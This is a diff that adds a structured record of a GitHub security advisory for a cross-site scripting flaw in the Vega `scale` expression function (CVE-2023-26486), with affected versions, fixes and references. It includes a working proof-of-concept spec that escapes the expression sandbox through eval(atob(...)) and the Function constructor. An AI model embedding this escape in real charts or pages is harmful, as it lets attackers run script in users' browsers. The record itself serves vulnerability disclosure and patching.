@@ -1,0 +1,78 @@
+advisory_id: GHSA-4vq7-882g-wcg4
+datasource_id: github_osv_importer_v2/GHSA-4vq7-882g-wcg4
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-4vq7-882g-wcg4/GHSA-4vq7-882g-wcg4.json
+aliases:
+  - CVE-2023-26486
+summary: |
+  Vega Expression Language `scale` expression function Cross Site Scripting
+  ### Summary
+  The Vega `scale` expression function has the ability to call arbitrary functions with a single controlled argument. This can be exploited to escape the Vega expression sandbox in order to execute arbitrary JavaScript.
+
+  ### Details
+
+  The [scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) expression function passes a user supplied argument `group` to [getScale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6), which is then used as if it were an internal context. The `context.scales[name].value` is accessed from `group` and called as a function back in `scale`.
+
+  ### PoC
+  The following Vega definition can be used to demonstrate this issue executing the JavaScript code `alert(1);`
+  ```json
+  {
+    "$schema": "https://vega.github.io/schema/vega/v5.json",
+    "data": [
+      {
+        "name": "XSS PoC",
+        "values": [1],
+        "transform": [
+          {
+            "type": "formula",
+            "as": "amount",
+            "expr": "scale('func', null,  {context: {scales: {func: {value: scale('func', 'eval(atob(\"YWxlcnQoMSk7\"))', {context: {scales: {func: {value: [].constructor.constructor}}}})}}}})"
+          }
+        ]
+      }
+    ]
+  }
+  ```
+
+  This can be viewed in the Vega online IDE at https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA
+impacted_packages:
+  - purl: pkg:npm/vega-functions
+    affected_versions: vers:npm/<5.13.1
+    fixed_versions: vers:npm/5.13.1
+  - purl: pkg:npm/vega
+    affected_versions: vers:npm/<5.23.0
+    fixed_versions: vers:npm/5.23.0
+severities:
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-4vq7-882g-wcg4/GHSA-4vq7-882g-wcg4.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/vega/vega
+    reference_type:
+    reference_id:
+  - url: https://github.com/vega/vega/releases/tag/v5.23.0
+    reference_type:
+    reference_id:
+  - url: https://github.com/vega/vega/security/advisories/GHSA-4vq7-882g-wcg4
+    reference_type:
+    reference_id:
+  - url: https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37
+    reference_type:
+    reference_id:
+  - url: https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-26486
+    reference_type:
+    reference_id:
+  - url: https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA
+    reference_type:
+    reference_id:
